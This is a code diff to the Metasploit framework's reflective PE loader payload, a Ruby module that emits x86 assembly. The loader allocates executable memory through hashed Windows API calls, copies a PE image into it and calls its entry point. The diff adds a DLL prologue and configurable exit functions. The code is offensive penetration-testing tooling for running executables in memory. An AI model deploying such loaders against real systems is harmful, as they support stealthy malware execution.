@@ -6,7 +6,18 @@ require 'msf/core/payload/windows/block_api'
 module Msf
   module Payload::Windows::ReflectivePELoader
     include Payload::Windows::BlockApi
-    def asm_reflective_pe_loader
+    def asm_reflective_pe_loader(opts)
+
+      prologue = ''
+      if opts[:is_dll] == true
+        prologue = %(
+  push 0x00
+  push 0x01
+  push edi
+  sub [esp],eax
+)
+      end
+
       %^
 stub:
 	cld                     ; Clear direction flags
@@ -25,7 +36,7 @@ start:                    ;
 	push 0x103000           ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
 	push dword [esp+12]     ; dwSize
 	push 0x00               ; lpAddress
-	push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}         ; ror13( "kernel32.dll", "VirtualAlloc" )
+	push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
 	call ebp                ; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	push eax                ; Save the new image base to stack
 	xor edx,edx             ; Zero out the edx
@@ -138,7 +149,7 @@ GetProcAddress:
 	ret                     ; <-
 complete:
 	pop eax                 ; Clean out the stack
-	pop edi
+	pop edi                 ; ..
 	mov edx,edi             ; Copy the address of new base to EDX
 	pop eax                 ; Pop the address_of_entry to EAX
 	add edi,eax             ; Add the address of entry to new image base
@@ -149,19 +160,12 @@ memcpy:
 	inc esi                 ; Increase PE image index
 	inc edx                 ; Increase image base index
 	loop memcpy             ; Loop until ECX = 0
-CreateThread:
-	xor eax,eax             ; Zero out the eax
-	push eax                ; lpThreadId
-	push eax                ; dwCreationFlags
-	push eax                ; lpParameter
-	push edi                ; lpStartAddress
-	push eax                ; dwStackSize
-	push eax                ; lpThreadAttributes
-	push #{Rex::Text.block_api_hash('kernel32.dll', 'CreateThread')}         ; ror13( "kernel32.dll","CreateThread" )
-	call ebp                ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
-fin:
-	nop                     ; Chill ;)
-	jmp fin                 ; To infinity and beyond !
+PE_Start:
+  #{prologue}
+  call edi                ; Call PE AOE
+  push 0x00               ; dwExitCode
+  push #{'0x%.8x' % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
+  call api_call           ; Call the exit funk based on exit_type
       ^
     end
   end
